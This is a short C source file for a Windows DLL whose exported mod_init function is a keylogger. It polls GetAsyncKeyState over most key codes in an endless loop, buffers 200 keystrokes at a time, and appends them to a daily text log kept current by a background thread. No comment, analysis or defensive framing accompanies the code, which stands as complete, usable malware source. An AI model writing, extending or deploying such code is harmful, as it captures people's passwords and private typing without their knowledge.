#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include <ctype.h>
#include <time.h>

#define BUFFSIZE 200

char log_name[20];

int Save(int *buffer)
{
	FILE *fptr;
	fptr = fopen(log_name, "a+");
	int i;
	for (i = 0; i < BUFFSIZE; i++)
	{
		fprintf(fptr, "%d ", *buffer);
		buffer++;
	}

	fprintf(fptr, "\n", buffer);
	fclose(fptr);

	return 0;
}

void check_date()
{
	time_t t = time(NULL);
	struct tm tm = *localtime(&t);
	char date[20];

	snprintf(date, sizeof(log_name), "%d-%d-%d.txt", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday);

	if (strcmp(log_name, date) != 0)
		strcpy(log_name, date);
}


DWORD WINAPI ThreadFunc(void* data) {

	while (1)
	{
		check_date();
		Sleep(3600000);
	}
	return 0;
}

__declspec(dllexport) void mod_init()
{
	int i;
	int buffer_size = 0;
	int buffer[BUFFSIZE];
	HANDLE thread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);

	while (1)
	{
		for (i = 8; i <= 190; i++)
		{
			if (GetAsyncKeyState(i) & 0x0001)
			{
				if (buffer_size == BUFFSIZE)
				{
					Save(buffer);
					buffer_size = 0;
					fflush(stdin);
				}
				buffer[ buffer_size ] = i;
				printf("%d ", buffer[buffer_size]);
				buffer_size++;
			}
		}
	}
	return 0;
}

